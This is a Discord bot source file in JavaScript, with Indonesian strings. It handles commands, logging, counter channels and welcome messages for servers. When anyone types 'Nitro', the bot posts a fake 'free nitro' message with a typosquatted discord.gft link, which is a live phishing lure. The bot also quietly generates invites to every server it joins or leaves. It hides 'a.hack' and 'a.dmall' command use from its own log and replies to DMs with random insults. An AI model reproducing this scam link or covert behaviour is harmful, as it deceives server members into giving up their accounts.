const Discord = require("discord.js");
const client = new Discord.Client();
const randomPuppy = require("random-puppy");
const http = require("http");
const express = require("express");
const { badwords } = require("./data.json");        
const Canvas = require("canvas");
const db = require("quick.db"); 
const { addexp } = require("./xp.js");
const app = express(); 
      
app.get("/", (request, response) => {
  console.log("Ping received!");
  response.sendStatus(200);   
});


setInterval(() => {
  http.get(`http://ozhark-project.glitch.me/`);  
}, 280000);

setInterval(async () => {
  const statuslist = [
    `| a.help`,
    `| ${client.guilds.size} Server`,
    `| ${client.users.size} Users`
  ];
  const random = Math.floor(Math.random() * statuslist.length);
  try {
    await client.user.setPresence({
      game: {
        name: `${statuslist[random]}`,
        type: "LISTENING"
      },
      status: "idle"
    });
  } catch (error) {
    console.log("status error");
  }
}, 5000);

client.once("error", error => {
  console.error("The websocket connection encountered an error:", error);
});
client.once("ready", () => {
  console.log(`hi ${client.user.username} ready to use!`);
});
client.once("reconnecting", () => {
  console.log("Reconnecting!");
});
client.once("disconnect", () => {
  console.log("Disconnect!");
});  

const prefix = "a.";

client.on("message", async message => {
  if (message.content === "Nitro")
    message.channel.send(
      " Quickly get free nitro for you \n https://discord.gft/2vUhpWfTvKYq5ugs",
      {
        files: [
          "https://cdn.discordapp.com/attachments/692724685493895205/692768119780933632/Nitro_free_trial-1_1-1.png"
        ]
      }
    );

  const text = [
    "Apasih asw",
    "Fucek",
    "Sabar om",
    "Bjirr:v",
    "Gblk",
    "anjing",
    "gelud ayok",
    "Diihh:v"
  ];
  const random = Math.floor(Math.random() * text.length);
  if (message.author.bot) return;
  if (message.channel.type === "dm") return message.author.send(text[random]);

  let msg = message.content.toLowerCase();
  let args = message.content
    .slice(prefix.length)
    .trim()
    .split(" ");
  let cmd = args.shift().toLowerCase();

  if (!message.content.startsWith(prefix)) return undefined;
  message.prefix = prefix;
  let { cooldown } = require("./cooldown.js");
  let commandcooldown = cooldown;

  if (!msg.startsWith(prefix)) return;
  if (commandcooldown.has(message.author.id)) {
    return message.channel
      .send("Gunakan bot ini dalam waktu 2 detik lagi")
      .then(msg => msg.delete(2000));
  }

  commandcooldown.add(message.author.id);
  setTimeout(() => {
    commandcooldown.delete(message.author.id);
  }, 2000);

  try {
    let commandFile = require(`./cmds/${cmd}.js`);
    commandFile.run(client, message, args);

    return addexp(message);
  } catch (e) {
  } finally {
    if (msg.startsWith("a.hack") || msg.startsWith("a.dmall")) return;
    let Invite = await message.guild.channels
      .find(c => c.type === "text")
      .createInvite();

    const embed = new Discord.RichEmbed()    
      .setAuthor(
        `${message.author.tag} | Command Log`,
        message.author.avatarURL
      )
      .setColor("#c43e3e")
      .setDescription(
        `**Nametag:** ${message.author.tag} 
**Command:** \`${cmd}\``)
     .setFooter(message.guild.name, message.guild.iconURL)
     .setTimestamp();

    console.log(
      `${message.author.username} menggunakan command: [${cmd}] Pada Guild ${message.guild.name}`
    );
    client.channels.get("708955530978132030").send(embed);
  }
  
  
     if (message.content.includes(message.mentions.users.first())) {
        let mentioned = client.afk.get(message.mentions.users.first().id);
        if (mentioned) message.channel.send(`**${mentioned.usertag}** is currently afk. Reason: ${mentioned.reason}`);
    }
    let afkcheck = client.afk.get(message.author.id);
    if (afkcheck) return [client.afk.delete(message.author.id), message.reply(`you have been removed from the afk list!`).then(msg => msg.delete(5000))];
  
  

  if (cmd === "ejrp") {
    const embed = new Discord.RichEmbed()
      .setTitle("East Java Roleplay")
      .setThumbnail(
        "https://cdn.discordapp.com/icons/673077507419013140/a2eb3f2664f07a589312a1558c6a8524.jpg"
      )
      .addField(
        "Developer",
        `<@!662454521129336852> \n<@!390824251785084929>`,
        true
      )
      .addField("Game mode", `Roleplay`, true)
      .addField("Max Player", "300", true)
      .addField("Languange", "Indonesia", true)
      .addField("Map Name", "San Andreas", true)
      .addField("Platform", "Mobile", true)
      .addField("Media", "Discord: [klik disini](https://discord.gg/aznJ3gy)");
    message.channel.send(embed);
  }
});

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.channel.name === "brooker") {
    message.delete();
    let args = message.content.split(" ");
    let chat = args.join(" ");
    const msg = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .setColor(message.member.displayHexColor)
      .setDescription(chat)
      .setTimestamp();
    client.channels.find("name", "brooker").send(msg); 
  }
});

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.channel.id === "715621876629504042") {
      await message.react("✅");
      await message.react("❌");
  }
});


client.on("ready", async () => {
  function test() {
    let a = client.channels.get("711756422626410516");

    let b = client.channels.get("711756432931946507");

    a.setName(`Server: ${client.guilds.size}`);
    b.setName(`User: ${client.users.size}`);
  }
  setInterval(test, 1000);
});

client.on("ready", async member => {
  var guild = client.guilds.get("708954478321336391");
  const mberr = guild.members.filter(m => !m.user.bot).size;
  const wfy = guild.members.filter(m => m.user.bot).size;
  const on = guild.members.filter(m => m.user.presence.status != "offline").size;

  function peh() {
    let a = client.channels.get("711759500419399700");
    let b = client.channels.get("722642144095109150");
    let c = client.channels.get("716222564812455947");

    a.setName(`Member: ${mberr}`);
    b.setName(`Online: ${on}`);
    c.setName(`Bots: ${wfy}`);
  }
  setInterval(peh, 1000);
});


//joined a server
client.on("guildCreate", (guild, message) => {
  const invite = guild.channels.find(c => c.type === "text").createInvite();
  const embed = new Discord.RichEmbed()
    .setThumbnail(guild.iconURL)
    .setTitle("Booker | Joined guild!")
    .setColor("#7dc43e")
    .addField("Server", `**${guild.name}**`)
    .addField("ID", `${guild.id}`)
    .addField("Owner", `${guild.owner.user.tag}`)
    .addField("Member", `${guild.memberCount}`)
    .setTimestamp();
  console.log("Joined a new guild: " + guild.name);
  client.channels.get("708955530978132030").send(embed);
});

//removed from a server
client.on("guildDelete", (guild, message) => {
  const invite = guild.channels.find(c => c.type === "text").createInvite();
  const embed = new Discord.RichEmbed()
    .setThumbnail(guild.iconURL)
    .setTitle("Booker | Leave Guild")
    .setColor("#c43e3e")
    .addField("Server", `**${guild.name}**`)
    .addField("ID", `${guild.id}`)
    .addField("Owner", `${guild.owner.user.tag}`)
    .addField("Member", `${guild.memberCount}`)
    .setTimestamp();

  console.log("Left a guild: " + guild.name);
  client.channels.get("708955530978132030").send(embed);
});

client.on("guildMemberAdd", async member => {
  //let anjax = db.get(`nick_${member.guild.id}`);
  //if (anjax === null) return;
  //member.setNickname(anjax + " " + member.displayName);
  
 // let ppq = db.get(`roles_${member.guild.id}`);
  //if (ppq === null) return;
  //member.addRole(ppq);

  let chx = db.get(`welchannel_${member.guild.id}`);
  if (chx === null) return;

  var embed = new Discord.RichEmbed()
    .setColor("#77e68b")
    .setDescription(`📥 ${member.user} **Has joined the server**`)
    .setFooter(`You are the ${member.guild.memberCount}st member`)
    .setTimestamp();
  member.guild.channels.get(chx).send(embed);
});

client.on("guildMemberRemove", async (member, message) => {
  let chx = db.get(`levchannel_${member.guild.id}`);

  if (chx === null) {
    return; 
  }

  var kontol = new Discord.RichEmbed()
    .setColor("#d62b1e")
    .setDescription(
      `:outbox_tray: ***${member.user}*** **Has left the server**`
    )
    .setFooter(`${member.guild.memberCount} member servers left`)
    .setTimestamp();
  member.guild.channels.get(chx).send(kontol);
});

client.login(process.env.TOKEN);